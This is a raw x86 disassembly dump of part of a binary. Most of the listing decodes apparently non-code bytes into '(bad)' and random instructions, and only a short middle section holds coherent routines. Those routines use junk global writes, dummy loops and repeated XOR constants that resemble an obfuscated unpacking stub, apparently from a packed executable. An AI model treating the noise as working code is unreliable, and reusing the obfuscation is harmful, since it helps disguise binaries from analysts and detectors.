  410bdd:	cmc    
  410bde:	sahf   
  410bdf:	push   ds
  410be0:	mov    ah,0x60
  410be2:	out    dx,eax
  410be3:	jmp    0x198c:0xc2e49f88
  410bea:	jo     0x410bcf
  410bec:	bswap  edx
  410bee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bef:	adc    eax,0x9cac5f67
  410bf4:	hlt    
  410bf5:	rcr    DWORD PTR [esi+ebp*1],1
  410bf8:	sub    al,0x27
  410bfa:	das    
  410bfb:	inc    esp
  410bfc:	loop   0x410c43
  410bfe:	loope  0x410bbb
  410c00:	ins    DWORD PTR es:[edi],dx
  410c01:	jmp    0xb122:0xe4be32f5
  410c08:	or     ah,ch
  410c0a:	mov    ds,WORD PTR [ebx-0x60e78d48]
  410c10:	adc    eax,0x1069a145
  410c15:	cmp    DWORD PTR [esi],ebp
  410c17:	fwait
  410c18:	sbb    al,0x48
  410c1a:	dec    edi
  410c1b:	jb     0x410c16
  410c1d:	addr16 out 0xbb,eax
  410c20:	call   DWORD PTR cs:[ecx+0x5a]
  410c24:	mul    BYTE PTR [ebp+0x8162b48]
  410c2a:	xor    eax,0x1d92d151
  410c2f:	nop
  410c30:	xlat   BYTE PTR ds:[ebx]
  410c31:	test   al,0x97
  410c33:	dec    eax
  410c34:	cdq    
  410c35:	(bad)  
  410c36:	pop    ebx
  410c37:	paddusw mm5,QWORD PTR [edx+ebp*4-0x1e]
  410c3c:	daa    
  410c3d:	pop    si
  410c3f:	sbb    ebx,ebp
  410c41:	pminub mm7,mm0
  410c44:	push   ecx
  410c45:	int3   
  410c46:	in     eax,dx
  410c47:	and    bh,BYTE PTR [ebp-0x72]
  410c4a:	add    DWORD PTR [eax+0x4],edi
  410c4d:	add    BYTE PTR [esi-0x60],ch
  410c50:	xor    DWORD PTR [ecx],0x56
  410c53:	scas   al,BYTE PTR es:[edi]
  410c54:	fistp  WORD PTR [edi]
  410c56:	cli    
  410c57:	pop    ecx
  410c58:	out    0x21,eax
  410c5a:	in     al,dx
  410c5b:	mov    al,ds:0x4f15cb8b
  410c60:	adc    al,0xdb
  410c62:	mov    eax,DWORD PTR [ecx-0x61]
  410c65:	jb     0x410c48
  410c67:	shr    DWORD PTR [ecx],cl
  410c69:	pop    ecx
  410c6a:	inc    esp
  410c6b:	mov    dh,0x5f
  410c6d:	adc    esp,DWORD PTR ds:0xb5f1b436
  410c73:	and    DWORD PTR [eax-0x42],0xffffff91
  410c77:	sbb    esp,edi
  410c79:	inc    ebp
  410c7a:	mov    edi,0xdd12c92f
  410c7f:	lds    edx,FWORD PTR [eax]
  410c81:	xchg   ebx,eax
  410c82:	stos   BYTE PTR es:[edi],al
  410c83:	adc    edi,DWORD PTR [eax+0x1a]
  410c86:	imul   ebx,DWORD PTR [ebp+0x58],0x6b9b6ba4
  410c8d:	and    al,0x8e
  410c8f:	data16 int3 
  410c91:	aam    0x25
  410c93:	nop
  410c94:	sub    eax,eax
  410c96:	adc    ah,BYTE PTR [ecx+ebp*8]
  410c99:	push   es
  410c9a:	nop
  410c9b:	gs retf 
  410c9d:	test   eax,0xa2326cdf
  410ca2:	sub    DWORD PTR [eax-0x41],esp
  410ca5:	cmp    al,BYTE PTR [ebx-0x25]
  410ca8:	sbb    eax,0xa773ddf2
  410cad:	xchg   esp,eax
  410cae:	jae    0x410c7d
  410cb0:	dec    edx
  410cb1:	imul   edx,DWORD PTR [edx+0x5f57b353],0xf7f1251d
  410cbb:	test   al,0x6d
  410cbd:	stos   BYTE PTR es:[edi],al
  410cbe:	sbb    eax,DWORD PTR [edi+0x6dbcc5db]
  410cc4:	add    dh,BYTE PTR [edi-0x5b]
  410cc7:	es ds js 0x410ce5
  410ccb:	jno    0x410c85
  410ccd:	adc    eax,0xf9b4ee38
  410cd2:	mov    bl,0xf4
  410cd4:	std    
  410cd5:	daa    
  410cd6:	sub    ecx,DWORD PTR [edi]
  410cd8:	or     al,0x59
  410cda:	xchg   edi,eax
  410cdb:	ret    0x2b19
  410cde:	out    dx,al
  410cdf:	inc    edi
  410ce0:	jecxz  0x410d3c
  410ce2:	mov    esi,0xdb6d91af
  410ce7:	jg     0x410c70
  410ce9:	jo     0x410d5c
  410ceb:	mov    ch,0x70
  410ced:	pop    edx
  410cee:	lock jo 0x410d3a
  410cf1:	hlt    
  410cf2:	sahf   
  410cf3:	lea    esi,[ecx-0x15f556da]
  410cf9:	mov    ebx,0xe90679b2
  410cfe:	in     al,dx
  410cff:	push   ebx
  410d00:	xchg   esp,eax
  410d01:	retf   
  410d02:	sub    BYTE PTR [ebx-0x48],ah
  410d05:	xchg   edi,eax
  410d06:	call   0xced8:0x2766ee20
  410d0d:	jb     0x410ce7
  410d0f:	push   cs
  410d10:	ins    DWORD PTR es:[edi],dx
  410d11:	inc    esi
  410d12:	sbb    bl,bh
  410d14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d15:	arpl   WORD PTR [ecx+0x4f7606e0],si
  410d1b:	xor    eax,0xcdbbb478
  410d20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d21:	push   ecx
  410d22:	mov    bh,0xad
  410d24:	add    eax,0xac67bae5
  410d29:	pushf  
  410d2a:	dec    ebp
  410d2b:	cmp    eax,0x3ef2b765
  410d30:	(bad)  
  410d31:	arpl   WORD PTR ds:0x362f0ff7,si
  410d37:	pop    ebx
  410d38:	ret    
  410d39:	call   0xa3003256
  410d3e:	push   esi
  410d3f:	repz call 0xce3164f
  410d45:	pop    ebx
  410d46:	mov    ?,esi
  410d48:	inc    edx
  410d49:	imul   edi,DWORD PTR [eax-0x12bc6d64],0x68dc0a9d
  410d53:	lock pop ecx
  410d55:	adc    al,0x69
  410d57:	and    al,0x5a
  410d59:	icebp  
  410d5a:	fstp   DWORD PTR [ecx]
  410d5c:	shr    BYTE PTR [edx+0x57],0x2b
  410d60:	push   0x2c84f267
  410d65:	add    eax,0xe8df32fc
  410d6a:	fs mov dl,0x92
  410d6d:	ror    BYTE PTR [ecx+0x12],0x8f
  410d71:	inc    esi
  410d72:	jle    0x410d63
  410d74:	stos   BYTE PTR es:[edi],al
  410d75:	jl     0x410d81
  410d77:	js     0x410d5f
  410d79:	push   ds
  410d7a:	adc    bh,BYTE PTR [eax]
  410d7c:	(bad)  
  410d7e:	(bad)  
  410d7f:	loope  0x410da7
  410d81:	(bad)  
  410d82:	add    eax,0xb81943ce
  410d87:	lock jo 0x410ded
  410d8a:	hlt    
  410d8b:	sbb    bl,BYTE PTR [ebx-0x1]
  410d8e:	jle    0x410d94
  410d90:	mov    bl,0xda
  410d92:	call   0x433c312f
  410d97:	mov    ebp,0xc4e2411f
  410d9c:	cdq    
  410d9d:	jmp    0x4b37:0xaf646820
  410da4:	lahf   
  410da5:	jns    0x410e0d
  410da7:	clc    
  410da8:	xor    eax,0x5db64caf
  410dad:	and    DWORD PTR [edi],edi
  410daf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410db0:	(bad)  
  410db1:	mov    esi,0xf37bbd92
  410db6:	pop    es
  410db7:	mov    eax,ds:0x4f37f202
  410dbc:	aaa    
  410dbd:	sar    BYTE PTR [esi+0x21],1
  410dc0:	xor    BYTE PTR [edi-0x14],ch
  410dc3:	xchg   esi,eax
  410dc4:	stc    
  410dc5:	or     eax,0x922c59b5
  410dca:	test   al,0x43
  410dcc:	aam    0x8
  410dce:	mov    bl,BYTE PTR [edi-0x7f591c04]
  410dd4:	or     eax,edi
  410dd6:	cmc    
  410dd7:	test   eax,0x9d568bb5
  410ddc:	add    eax,0xab360585
  410de1:	sub    BYTE PTR [esi-0x4b],dl
  410de4:	adc    ebx,eax
  410de6:	mov    dl,0xc8
  410de8:	xchg   esi,eax
  410de9:	mov    ch,0xf0
  410deb:	clc    
  410dec:	ret    
  410ded:	sahf   
  410dee:	and    bh,BYTE PTR ds:0x67d68c36
  410df4:	scas   al,BYTE PTR es:[edi]
  410df5:	fs gs xor esi,esp
  410df9:	push   ecx
  410dfa:	aas    
  410dfb:	xor    ebp,DWORD PTR [ebx-0x2343e3ad]
  410e01:	cmp    dh,BYTE PTR [esi+0x564cd444]
  410e07:	jo     0x410e33
  410e09:	push   esp
  410e0a:	daa    
  410e0b:	fucomp st(4)
  410e0d:	mov    edi,0xaa27daa1
  410e12:	inc    ah
  410e14:	fisub  WORD PTR [ebp+0x5]
  410e17:	std    
  410e18:	sbb    al,0xfa
  410e1a:	test   DWORD PTR [ecx+0x20883aba],ebx
  410e20:	daa    
  410e21:	dec    ecx
  410e22:	pop    eax
  410e23:	sub    DWORD PTR [edx+0xfae8262],eax
  410e29:	(bad)  
  410e2a:	(bad)  
  410e2b:	push   esi
  410e2c:	cmp    eax,0x3d843ada
  410e31:	aaa    
  410e32:	push   0x1f
  410e34:	and    al,dl
  410e36:	sub    BYTE PTR [eax-0xe],cl
  410e39:	dec    ebp
  410e3a:	mov    eax,0x907fc27e
  410e3f:	mov    cl,0xe1
  410e41:	or     al,0xee
  410e43:	cld    
  410e44:	inc    esi
  410e45:	mov    al,0x3f
  410e47:	cmp    DWORD PTR [eax],eax
  410e49:	inc    ebx
  410e4a:	jg     0x410eb6
  410e4c:	test   al,0x15
  410e4e:	push   cs
  410e4f:	push   ebx
  410e50:	aad    0xa
  410e52:	pusha  
  410e53:	xlat   BYTE PTR ds:[ebx]
  410e54:	sti    
  410e55:	int    0x54
  410e57:	(bad)  
  410e58:	icebp  
  410e59:	jne    0x410ea3
  410e5b:	pop    esp
  410e5c:	outs   dx,BYTE PTR ds:[esi]
  410e5d:	jo     0x410e59
  410e5f:	mov    fs,WORD PTR [ebp+0x64]
  410e62:	jge    0x410e00
  410e64:	dec    edi
  410e65:	jl     0x410e09
  410e67:	add    DWORD PTR [esi],esp
  410e69:	adc    esp,0x69957305
  410e6f:	mov    ebp,0x4dcb52c1
  410e74:	imul   esi,DWORD PTR [ebx-0x65],0xffffffb5
  410e78:	sti    
  410e79:	xchg   edi,eax
  410e7a:	xchg   ecx,eax
  410e7b:	je     0x410eb9
  410e7d:	push   ds
  410e7e:	mov    edx,0xec7509ef
  410e83:	cmp    DWORD PTR [esp+esi*8+0x60f9089],eax
  410e8a:	ds pop ss
  410e8c:	push   eax
  410e8d:	pushf  
  410e8e:	fstp   st(1)
  410e90:	xor    ah,al
  410e92:	ja     0x410ef3
  410e94:	adc    dl,BYTE PTR [eax]
  410e96:	js     0x410e8e
  410e98:	dec    eax
  410e99:	pop    edi
  410e9a:	ss jae 0x410e4f
  410e9d:	mov    ah,BYTE PTR [ecx-0x1a]
  410ea0:	mov    cl,BYTE PTR [edi+0x5e683551]
  410ea6:	outs   dx,BYTE PTR ds:[esi]
  410ea7:	retf   0x7381
  410eaa:	(bad)  
  410eab:	repz gs pop es
  410eae:	and    al,0x88
  410eb0:	outs   dx,DWORD PTR ds:[esi]
  410eb1:	sub    eax,0x33ac7159
  410eb6:	out    0xc3,al
  410eb8:	fs and al,0x23
  410ebb:	pop    edx
  410ebc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ebd:	cli    
  410ebe:	fidivr WORD PTR [edi-0xc]
  410ec1:	cwde   
  410ec2:	pop    ecx
  410ec3:	push   ebx
  410ec4:	fnsave [edi]
  410ec6:	mov    bh,0xcb
  410ec8:	xchg   ebx,eax
  410ec9:	mov    bh,0xc2
  410ecb:	mov    edx,0xcaff3664
  410ed0:	sub    esi,DWORD PTR [esp+ebp*8-0x59]
  410ed4:	int    0xbb
  410ed6:	push   ecx
  410ed7:	inc    ebx
  410ed8:	and    edx,ebx
  410eda:	dec    edx
  410edb:	mov    al,ds:0x1be29719
  410ee0:	sbb    cl,BYTE PTR [ebx-0xe]
  410ee3:	cmc    
  410ee4:	jp     0x410edc
  410ee6:	or     al,0xa4
  410ee8:	test   ah,al
  410eea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410eeb:	enter  0xaf6e,0x28
  410eef:	ins    DWORD PTR es:[edi],dx
  410ef0:	sub    al,0x15
  410ef2:	(bad)  
  410ef4:	into   
  410ef5:	mov    dh,0x8d
  410ef7:	mov    edi,0x250bb4f2
  410efc:	fiadd  DWORD PTR [edi+ebx*4-0x5aa3a71]
  410f03:	fs jmp 0x13ca:0xe9e555c9
  410f0b:	nop
  410f0c:	pop    es
  410f0d:	adc    eax,0x6c31dee1
  410f12:	retf   0x55f2
  410f15:	jno    0x410efb
  410f17:	xlat   BYTE PTR ds:[ebx]
  410f18:	imul   edi,DWORD PTR [edx],0x5b6e5e2f
  410f1e:	icebp  
  410f1f:	inc    esi
  410f20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f21:	xchg   esi,eax
  410f22:	fild   DWORD PTR [edi-0x707ca9b6]
  410f28:	ret    0x562f
  410f2b:	xchg   ecx,ecx
  410f2d:	(bad)  [ebx]
  410f2f:	lea    esp,[eax]
  410f31:	pop    eax
  410f32:	mov    esp,0xb9188e80
  410f37:	mov    ?,ecx
  410f39:	dec    edi
  410f3a:	pop    es
  410f3b:	pop    eax
  410f3c:	movzx  ebp,di
  410f3f:	(bad)  
  410f41:	cmc    
  410f42:	gs and ebx,edi
  410f45:	(bad)  [ecx+0x4c]
  410f48:	mov    bl,0x3c
  410f4a:	dec    edi
  410f4b:	nop
  410f4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f4d:	jnp    0x410f9d
  410f4f:	and    eax,0xcb2772b7
  410f54:	or     esp,edi
  410f56:	(bad)  
  410f57:	or     DWORD PTR [ebx+0x19],0xfffffff7
  410f5b:	push   0xffffffee
  410f5d:	adc    eax,0x4c7a958f
  410f62:	les    eax,FWORD PTR [edx-0x488849e9]
  410f68:	or     DWORD PTR [edx-0x75],0x628f04f6
  410f6f:	cs jmp 0xf2e9:0x65041371
  410f77:	sub    ah,dl
  410f79:	ret    
  410f7a:	fldcw  WORD PTR [eax]
  410f7c:	into   
  410f7d:	jmp    0xef425707
  410f82:	mov    ebp,0x72cb6891
  410f87:	add    al,0x90
  410f89:	dec    eax
  410f8a:	pop    ebp
  410f8b:	es sub eax,0x4b70999d
  410f91:	sub    DWORD PTR [ebx],0xfc932e7f
  410f97:	xor    eax,0x43a34507
  410f9c:	fisttp DWORD PTR [ebx+0x25c299e6]
  410fa2:	outs   dx,BYTE PTR ds:[esi]
  410fa3:	inc    esi
  410fa4:	jnp    0x410fe2
  410fa6:	pop    ebp
  410fa7:	pushf  
  410fa8:	ja     0x410f83
  410faa:	(bad)  [ebx]
  410fac:	jo     0x410f85
  410fae:	outs   dx,DWORD PTR ds:[esi]
  410faf:	pusha  
  410fb0:	push   ds
  410fb1:	dec    ebx
  410fb2:	popf   
  410fb3:	push   cs
  410fb4:	fld    DWORD PTR [esp+eiz*4+0x31]
  410fb8:	push   cs
  410fb9:	mov    edx,0x27c6f4d9
  410fbe:	cs xor eax,ecx
  410fc1:	xor    edi,ecx
  410fc3:	sub    DWORD PTR ds:0x42f01c,0x4b20
  410fcd:	mov    edx,0x3272e4
  410fd2:	add    edi,edx
  410fd4:	add    eax,edx
  410fd6:	imul   eax,edi
  410fd9:	mov    edi,DWORD PTR [ebp+0xc]
  410fdc:	cmp    edi,eax
  410fde:	je     0x411033
  410fe4:	mov    DWORD PTR [ebp-0xc],esi
  410fe7:	mov    eax,DWORD PTR [ebp-0xc]
  410fea:	mov    esi,DWORD PTR [ebp+0xc]
  410fed:	xor    eax,ecx
  410fef:	lea    eax,[eax*8+0x1939798]
  410ff6:	mov    eax,DWORD PTR [esi+eax*1]
  410ff9:	mov    DWORD PTR [ebp+0xc],eax
  410ffc:	mov    eax,DWORD PTR [ebp-0x4]
  410fff:	mov    esi,DWORD PTR [ebp-0x8]
  411002:	xor    eax,ecx
  411004:	xor    esi,ecx
  411006:	add    esi,edx
  411008:	add    eax,edx
  41100a:	imul   eax,esi
  41100d:	mov    esi,DWORD PTR [ebp+0xc]
  411010:	cmp    esi,eax
  411012:	je     0x411033
  411018:	mov    eax,DWORD PTR [ebp-0x4]
  41101b:	xor    eax,ecx
  41101d:	mov    ecx,DWORD PTR [ebp+0xc]
  411020:	add    eax,edx
  411022:	imul   eax,ecx
  411025:	add    eax,DWORD PTR [ebp+0x8]
  411028:	mov    DWORD PTR [ebp+0xc],eax
  41102b:	mov    eax,DWORD PTR [ebp+0xc]
  41102e:	jmp    0x411044
  411033:	mov    eax,DWORD PTR [ebp-0x4]
  411036:	mov    esi,DWORD PTR [ebp-0x8]
  411039:	xor    esi,ecx
  41103b:	xor    eax,ecx
  41103d:	add    esi,edx
  41103f:	add    eax,edx
  411041:	imul   eax,esi
  411044:	pop    edi
  411045:	pop    esi
  411046:	leave  
  411047:	ret    0x8
  41104a:	push   ebp
  41104b:	mov    ebp,esp
  41104d:	push   ecx
  41104e:	mov    DWORD PTR [ebp-0x4],0xf89c85bd
  411055:	mov    eax,DWORD PTR [ebp-0x4]
  411058:	mov    ecx,DWORD PTR ds:0x42f00c
  41105e:	sub    ecx,DWORD PTR ds:0x432000
  411064:	mov    DWORD PTR ds:0x42f00c,ecx
  41106a:	mov    edx,DWORD PTR [ebp+0x10]
  41106d:	and    DWORD PTR ds:0x431000,0x0
  411077:	mov    ecx,DWORD PTR ds:0x431000
  41107d:	inc    ecx
  41107e:	mov    DWORD PTR ds:0x431000,ecx
  411084:	cmp    DWORD PTR ds:0x431000,0x9
  41108b:	jb     0x4110c6
  411091:	jmp    0x41109f
  411096:	push   DWORD PTR [ebp-0x10]
  411099:	call   DWORD PTR ds:0x4348db
  41109f:	cmp    DWORD PTR ds:0x431000,0x8
  4110a6:	jne    0x4110b9
  4110ac:	mov    ecx,DWORD PTR ds:0x431000
  4110b2:	inc    ecx
  4110b3:	mov    DWORD PTR ds:0x431000,ecx
  4110b9:	cmp    DWORD PTR ds:0x431000,0x15
  4110c0:	jb     0x411077
  4110c6:	mov    ecx,0x751089d
  4110cb:	adc    DWORD PTR ds:0x42e01c,0x1fe6
  4110d5:	xor    eax,ecx
  4110d7:	sub    DWORD PTR ds:0x431014,0x42e018
  4110e1:	add    eax,0x3272e4
  4110e6:	adc    DWORD PTR ds:0x42f01c,0x6968
  4110f0:	mov    DWORD PTR [edx],eax
  4110f2:	mov    eax,DWORD PTR [ebp+0xc]
  4110f5:	xor    eax,ecx
  4110f7:	push   esi
  4110f8:	mov    esi,DWORD PTR [ebp+0x10]
  4110fb:	mov    edx,0x3272e4
  411100:	add    eax,edx
  411102:	mov    DWORD PTR [esi+0x4],eax
  411105:	mov    eax,DWORD PTR [ebp+0x14]
  411108:	mov    esi,DWORD PTR [ebp+0x10]
  41110b:	mov    DWORD PTR [esi+0x8],eax
  41110e:	mov    eax,DWORD PTR [ebp+0x18]
  411111:	mov    esi,DWORD PTR [ebp+0x10]
  411114:	mov    DWORD PTR [esi+0xc],eax
  411117:	mov    eax,DWORD PTR [ebp+0x1c]
  41111a:	mov    esi,DWORD PTR [ebp+0x10]
  41111d:	mov    DWORD PTR [esi+0x10],eax
  411120:	mov    eax,DWORD PTR [ebp+0x8]
  411123:	xor    eax,ecx
  411125:	add    eax,edx
  411127:	pop    esi
  411128:	leave  
  411129:	ret    0x18
  41112c:	push   ebp
  41112d:	mov    ebp,esp
  41112f:	sub    esp,0x9c
  411135:	mov    ecx,DWORD PTR [ebp+0x8]
  411138:	mov    eax,0x8a8e
  41113d:	adc    DWORD PTR ds:0x42f01c,0x2442
  411147:	xor    ax,WORD PTR [ecx+0x20]
  41114b:	mov    ecx,0x3b52
  411150:	add    ax,cx
  411153:	inc    ecx
  411154:	movzx  eax,ax
  411157:	mov    DWORD PTR [ebp-0x10],eax
  41115a:	xor    ecx,DWORD PTR ds:0x43201c
  411160:	mov    BYTE PTR [ebp-0x1],0x7d
  411164:	lea    eax,[ebp-0x1]
  411167:	or     DWORD PTR ds:0x42f010,edi
  41116d:	mov    DWORD PTR [ebp-0xc],eax
  411170:	sbb    ecx,DWORD PTR ds:0x42e008
  411176:	mov    al,BYTE PTR [ebp-0x1]
  411179:	mov    ecx,DWORD PTR [ebp-0xc]
  41117c:	add    DWORD PTR ds:0x43000c,0x430000
  411186:	xor    al,0x75
  411188:	or     DWORD PTR ds:0x43200c,0x43201c
  411192:	sub    al,0x7
  411194:	or     DWORD PTR ds:0x43000c,0x43101c
  41119e:	mov    BYTE PTR [ecx],al
  4111a0:	and    DWORD PTR ds:0x42e00c,0x0
  4111aa:	mov    ecx,DWORD PTR ds:0x42e00c
  4111b0:	inc    ecx
  4111b1:	mov    DWORD PTR ds:0x42e00c,ecx
  4111b7:	cmp    DWORD PTR ds:0x42e00c,0xa
  4111be:	jg     0x4111fb
  4111c4:	jmp    0x4111d4
  4111c9:	push   0x5c91
  4111ce:	call   DWORD PTR ds:0x434903
  4111d4:	cmp    DWORD PTR ds:0x42e00c,0x9
  4111db:	jne    0x4111ee
  4111e1:	mov    ecx,DWORD PTR ds:0x42e00c
  4111e7:	inc    ecx
  4111e8:	mov    DWORD PTR ds:0x42e00c,ecx
  4111ee:	cmp    DWORD PTR ds:0x42e00c,0x1b
  4111f5:	jb     0x4111aa
  4111fb:	mov    DWORD PTR [ebp-0x18],0xf89c8581
  411202:	push   ebx
  411203:	mov    DWORD PTR [ebp-0x8],0xf89c8580
  41120a:	xor    eax,eax
  41120c:	mov    ecx,DWORD PTR [ebp-0x18]
  41120f:	movzx  eax,WORD PTR ds:0x42f004
  411216:	sbb    DWORD PTR ds:0x43200c,eax
  41121c:	push   esi
  41121d:	adc    DWORD PTR ds:0x431010,0x64e6
  411227:	mov    eax,0x751089d
  41122c:	adc    DWORD PTR ds:0x430018,0x6491
  411236:	xor    ecx,eax
  411238:	mov    esi,0x3272e4
  41123d:	push   edi
  41123e:	add    ecx,esi
  411240:	mov    DWORD PTR ds:0x431018,0x6541
  41124a:	jmp    0x411278
  41124f:	mov    DWORD PTR ds:0x43000c,0x737f
  411259:	mov    dl,BYTE PTR [ebp-0x1]
  41125c:	mov    DWORD PTR ds:0x43201c,0x6aad
  411266:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  41126d:	mov    DWORD PTR ds:0x431008,0x1add
  411277:	inc    ecx
  411278:	mov    DWORD PTR ds:0x42f00c,0x3a2
  411282:	cmp    ecx,0x40
  411285:	jb     0x41124f
  41128b:	mov    edx,DWORD PTR [ebp-0x18]
  41128e:	mov    DWORD PTR ds:0x430000,0xd2a
  411298:	xor    edx,eax
  41129a:	sbb    DWORD PTR ds:0x430004,0x538e
  4112a4:	jmp    0x41365f
  4112a9:	and    ebx,DWORD PTR [ebx]
  4112ab:	mov    ecx,0x23c481e4
  4112b0:	fwait
  4112b1:	sbb    eax,0x58f7fae8
  4112b6:	neg    esp
  4112b8:	inc    ebx
  4112b9:	jecxz  0x411269
  4112bb:	jb     0x41132f
  4112bd:	rcr    BYTE PTR [edi+0x72],1
  4112c0:	jb     0x4112db
  4112c2:	xor    ecx,DWORD PTR [ecx]
  4112c4:	out    0x1d,al
  4112c6:	popf   
  4112c7:	dec    edi
  4112c8:	mov    esi,0x46788647
  4112cd:	inc    eax
  4112ce:	out    dx,al
  4112cf:	outs   dx,DWORD PTR ds:[esi]
  4112d0:	ss iret 
  4112d2:	stos   DWORD PTR es:[edi],eax
  4112d3:	push   ds
  4112d4:	inc    edx
  4112d5:	inc    esp
  4112d6:	sbb    BYTE PTR [ebx+ecx*8],bl
  4112d9:	push   0x2fa81a76
  4112de:	mov    bl,0x43
  4112e0:	inc    BYTE PTR [ebp+0x4c]
  4112e3:	xlat   BYTE PTR ds:[ebx]
  4112e4:	stc    
  4112e5:	lea    ecx,[edi-0x4fdf86d2]
  4112eb:	mov    dl,0x84
  4112ed:	inc    edx
  4112ee:	aaa    
  4112ef:	pop    esi
  4112f0:	and    ah,BYTE PTR [edx-0x28800785]
  4112f6:	jle    0x411375
  4112f8:	or     eax,0x8987f5ae
  4112fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112fe:	xchg   edx,eax
  4112ff:	repnz mov dl,0xd2
  411302:	inc    ebx
  411303:	loop   0x411304
  411305:	mov    al,ds:0xf21cc820
  41130a:	pop    ebp
  41130b:	mov    esi,0x4dde7f5a
  411310:	xor    eax,0x59700a88
  411315:	and    DWORD PTR [edi],ebp
  411317:	stos   DWORD PTR es:[edi],eax
  411318:	sbb    bl,BYTE PTR [esi+0x4c251719]
  41131e:	push   0x1f0b53a1
  411323:	pop    ss
  411324:	sub    eax,0xae117ef3
  411329:	dec    ebp
  41132a:	dec    ecx
  41132b:	fadd   QWORD PTR [esi+0x30f9043]
  411331:	sub    BYTE PTR [esi-0x6a],0x60
  411335:	les    ebx,FWORD PTR ds:0x2a46086d
  41133b:	xor    DWORD PTR [edi+ebx*8],esi
  41133e:	xchg   ebp,eax
  41133f:	sbb    DWORD PTR [ecx+0x6825191],ebx
  411345:	adc    DWORD PTR [edx],ecx
  411347:	pop    es
  411348:	ja     0x411375
  41134a:	jno    0x4112d6
  41134c:	sbb    al,ch
  41134e:	pusha  
  41134f:	push   DWORD PTR [edx-0x4f]
  411352:	rcpps  xmm7,XMMWORD PTR [ebx]
  411355:	dec    ebp
  411356:	out    0x17,al
  411358:	xor    al,0xc8
  41135a:	dec    ebp
  41135b:	mov    ecx,0x89eb712b
  411360:	gs pop ds
  411362:	and    dh,BYTE PTR [edx-0xe87da94]
  411368:	cmp    al,0xe1
  41136a:	ds retf 
  41136c:	fwait
  41136d:	in     eax,0x62
  41136f:	inc    ebp
  411370:	sti    
  411371:	(bad)  
  411372:	call   0x63aa:0x3afcf1c4
  411379:	rol    DWORD PTR [edi-0x5205d01f],0xa8
  411380:	mov    ebp,0x5410cea5
  411385:	xlat   BYTE PTR ds:[ebx]
  411386:	adc    eax,0x41a5c977
  41138b:	inc    edx
  41138c:	xchg   BYTE PTR [ebx+0x2d],cl
  41138f:	bound  ecx,QWORD PTR [eax+ebp*4]
  411392:	mov    eax,0xe0edc8fd
  411397:	xor    DWORD PTR [esi-0x2c3708a4],edx
  41139d:	fist   DWORD PTR [esi]
  41139f:	(bad)  
  4113a0:	cli    
  4113a1:	cmp    DWORD PTR [ebp-0x7355642],esi
  4113a7:	jmp    0x4aa72d98
  4113ac:	sub    BYTE PTR [edx+esi*4],cl
  4113af:	sub    BYTE PTR [edx-0x7d],ah
  4113b2:	mov    cl,0xd1
  4113b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113b5:	sbb    BYTE PTR [edx+0x5b],0x23
  4113b9:	jge    0x411382
  4113bb:	dec    edi
  4113bc:	outs   dx,BYTE PTR ds:[esi]
  4113bd:	frstor [edx-0x60]
  4113c0:	(bad)  
  4113c2:	sub    BYTE PTR [ebx-0x55],0xb6
  4113c6:	sub    DWORD PTR [edx],0x95fcbc08
  4113cc:	mov    ebp,0xcfd931
  4113d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113d2:	and    eax,0x82b12903
  4113d7:	adc    eax,0x71d5bb6
  4113dc:	and    eax,0x2fd4b7f6
  4113e1:	repz jne 0x411434
  4113e4:	or     al,0x18
  4113e6:	cmp    bh,BYTE PTR [eax+0x732bedce]
  4113ec:	and    al,0xab
  4113ee:	les    ebx,FWORD PTR [ebp-0x6e]
  4113f1:	scas   al,BYTE PTR es:[edi]
  4113f2:	test   eax,0xa332f298
  4113f7:	outs   dx,DWORD PTR ds:[esi]
  4113f8:	or     ah,ch
  4113fa:	outs   dx,BYTE PTR ds:[esi]
  4113fb:	jmp    0xba440e62
  411400:	retf   0xb629
  411403:	popf   
  411404:	mov    ebx,0xf7ec900a
  411409:	jne    0x411443
  41140b:	xor    edx,DWORD PTR [ebx-0x14da0267]
  411411:	push   ebp
  411412:	push   cs
  411413:	scas   al,BYTE PTR es:[edi]
  411414:	xor    BYTE PTR [edi],cl
  411416:	push   edx
  411417:	or     ah,bh
  411419:	xchg   esi,eax
  41141a:	inc    di
  41141c:	sub    al,0x1f
  41141e:	daa    
  41141f:	xor    al,0xda
  411421:	stos   DWORD PTR es:[edi],eax
  411422:	test   eax,0x193e070d
  411427:	dec    edx
  411428:	mov    ds:0xb22ce4f6,al
  41142d:	or     ebx,ebx
  41142f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411430:	test   al,0x63
  411432:	mov    WORD PTR [ebx+0x7410c733],?
  411438:	out    0x4b,al
  41143a:	mov    DWORD PTR [eax-0x4347aaf7],ebx
  411440:	out    dx,al
  411441:	pop    ecx
  411442:	sar    BYTE PTR [esi+0x44],1
  411445:	(bad)  
  411446:	nop
  411447:	(bad)  
  411448:	xor    eax,0x395a50a5
  41144d:	push   ebp
  41144e:	stos   BYTE PTR es:[edi],al
  41144f:	sti    
  411450:	dec    edx
  411451:	cmp    bh,BYTE PTR [esi+0x1a380d17]
  411457:	dec    ebx
  411458:	lock jge 0x41142e
  41145b:	sahf   
  41145c:	outs   dx,BYTE PTR ds:[esi]
  41145d:	dec    eax
  41145e:	aas    
  41145f:	std    
  411460:	dec    ecx
  411461:	scas   al,BYTE PTR es:[edi]
  411462:	nop
  411463:	xchg   esp,esi
  411465:	(bad)  
  411466:	jg     0x4114c1
  411468:	adc    ebx,DWORD PTR [ecx+0x3039b9a3]
  41146e:	ror    dh,1
  411470:	jge    0x4114a6
  411472:	nop
  411473:	fs fisubr DWORD PTR cs:[ebx-0x3da97705]
  41147b:	jl     0x41142c
  41147d:	int3   
  41147e:	jmp    0x411489
  411480:	jg     0x41140e
  411482:	hlt    
  411483:	push   ecx
  411484:	imul   BYTE PTR [ebx]
  411486:	adc    eax,DWORD PTR [esi+0x15]
  411489:	sub    al,0x9b
  41148b:	stos   BYTE PTR es:[edi],al
